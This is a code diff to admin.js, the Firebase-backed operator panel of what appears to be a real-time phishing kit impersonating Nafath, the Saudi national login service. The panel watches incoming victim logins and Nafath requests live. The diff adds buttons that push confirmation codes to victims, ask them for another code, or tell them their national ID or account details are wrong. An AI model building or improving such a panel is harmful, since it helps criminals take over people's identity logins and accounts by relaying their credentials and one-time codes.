@@ -1,4 +1,3 @@
-// admin.js
 import { db } from "./firebase-config.js";
 import { 
     collection, 
@@ -15,33 +14,51 @@ document.addEventListener('DOMContentLoaded', () => {
     const closeModalBtn = document.getElementById('closeModalBtn');
 
     let allLogs = {};
-    let currentTargetDoc = { id: "", type: "" }; // لحفظ العنصر الذي يتم تعديله حالياً
+    let currentTargetDoc = { id: "", type: "" }; 
 
     function renderTable() {
         logsTableBody.innerHTML = "";
         const sortedLogs = Object.values(allLogs).sort((a,b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));
 
         if(sortedLogs.length === 0) {
-            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد طلبات...</td></tr>`;
+            logsTableBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">لا توجد طلبات حالياً...</td></tr>`;
             return;
         }
 
         sortedLogs.forEach((log) => {
             const row = document.createElement('tr');
             
-            // تحديد نص الحالة بناءً على القيمة القادمة من الفايربيس
+            // تحويل وتحديد نص الحالة واللون المناسب لها بشكل ديناميكي
             let statusText = log.status;
-            if (log.status === "waiting_admin") statusText = "بانتظار الأدمن";
-            else if (log.status === "applied_success") statusText = "تم التقديم للوظيفة";
-            
-            let statusClass = log.status === "waiting_admin" ? "waiting" : "action-done";
+            let statusClass = "action-done"; // الافتراضي رمادي
 
-            // أزرار التحكم والإجراءات الديناميكية (إضافة زر التقديم الجديد)
+            if (log.status === "waiting_admin") {
+                statusText = "بانتظار الأدمن";
+                statusClass = "waiting";
+            } else if (log.status === "applied_success") {
+                statusText = "تم التقديم بنجاح";
+                statusClass = "status-success";
+            } else if (log.status === "show_code") {
+                statusText = `تم إرسال كود (${log.verificationCode || ''})`;
+                statusClass = "status-code";
+            } else if (log.status === "request_new_code") {
+                statusText = "بانتظار كود آخر من المستخدم";
+                statusClass = "status-waiting-new";
+            } else if (log.status === "wrong_national_id") {
+                statusText = "هوية غير صحيحة";
+                statusClass = "status-wrong";
+            } else if (log.status === "wrong_auth_data") {
+                statusText = "حساب غير صحيح";
+                statusClass = "status-wrong";
+            }
+
+            // أزرار التحكم والإجراءات الديناميكية (شاملة زر طلب كود آخر)
             const actionButtons = `
                 <button class="btn-action btn-code" data-id="${log.id}" data-type="${log.type}">رقم تأكيد</button>
+                <button class="btn-action btn-new-code" data-id="${log.id}" data-type="${log.type}">طلب كود آخر</button>
                 <button class="btn-action btn-wrong-id" data-id="${log.id}" data-type="${log.type}">هوية غير صحيحة</button>
                 <button class="btn-action btn-wrong-pass" data-id="${log.id}" data-type="${log.type}">حساب غير صحيح</button>
-                <button class="btn-action btn-applied" style="background-color: #27ae60; color: white;" data-id="${log.id}" data-type="${log.type}">تم التقديم</button>
+                <button class="btn-action btn-applied" data-id="${log.id}" data-type="${log.type}">تم التقديم</button>
             `;
 
             if (log.type === "app_request") {
@@ -63,35 +80,34 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             logsTableBody.appendChild(row);
         });
-
-        // ربط الأحداث بالأزرار بعد إنشائها
-        document.querySelectorAll('.btn-action').forEach(btn => {
-            btn.addEventListener('click', handleAction);
-        });
     }
 
-    // دالة معالجة نقر الأزرار من الأدمن
-    async function handleAction(e) {
+    // الاستماع لجميع نقرات الأزرار داخل الجدول بأداء عالٍ وطريقة ذكية
+    logsTableBody.addEventListener('click', async (e) => {
+        if (!e.target.classList.contains('btn-action')) return;
+
         const id = e.target.getAttribute('data-id');
         const type = e.target.getAttribute('data-type');
         const collectionName = type === "app_request" ? "nafath_app_requests" : "users_login";
         const docRef = doc(db, collectionName, id);
 
         if (e.target.classList.contains('btn-code')) {
-            // فتح المودال لإدخال رقم التأكيد
             currentTargetDoc = { id, type };
             codeModal.style.display = "flex";
+            confirmationCodeInput.focus();
+        } else if (e.target.classList.contains('btn-new-code')) {
+            // تحديث الحالة عند طلب كود آخر ليتحول جهاز المستخدم لشاشة إدخال الكود الجديد
+            await updateDoc(docRef, { status: "request_new_code" });
         } else if (e.target.classList.contains('btn-wrong-id')) {
             await updateDoc(docRef, { status: "wrong_national_id" });
         } else if (e.target.classList.contains('btn-wrong-pass')) {
             await updateDoc(docRef, { status: "wrong_auth_data" });
         } else if (e.target.classList.contains('btn-applied')) {
-            // تحديث الحالة عند الضغط على زر "تم التقديم"
             await updateDoc(docRef, { status: "applied_success" });
         }
-    }
+    });
 
-    // إرسال كود التأكيد للفايربيس لقراءة المستخدم له
+    // إرسال كود التأكيد الأول للفايربيس
     submitCodeBtn.addEventListener('click', async () => {
         const codeValue = confirmationCodeInput.value.trim();
         if(!codeValue) return;
@@ -110,7 +126,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     closeModalBtn.addEventListener('click', () => { codeModal.style.display = "none"; });
 
-    // الاستماع اللحظي للمجموعتين
-    onSnapshot(collection(db, "users_login"), (s) => { s.forEach(d => allLogs[d.id] = {id:d.id, type:"user_login", ...d.data()}); renderTable(); });
-    onSnapshot(collection(db, "nafath_app_requests"), (s) => { s.forEach(d => allLogs[d.id] = {id:d.id, type:"app_request", ...d.data()}); renderTable(); });
+    // الاستماع اللحظي للمجموعتين من الفايربيس وتحديث الجدول فوراً
+    onSnapshot(collection(db, "users_login"), (s) => { 
+        s.forEach(d => allLogs[d.id] = {id:d.id, type:"user_login", ...d.data()}); 
+        renderTable(); 
+    });
+    
+    onSnapshot(collection(db, "nafath_app_requests"), (s) => { 
+        s.forEach(d => allLogs[d.id] = {id:d.id, type:"app_request", ...d.data()}); 
+        renderTable(); 
+    });
 });
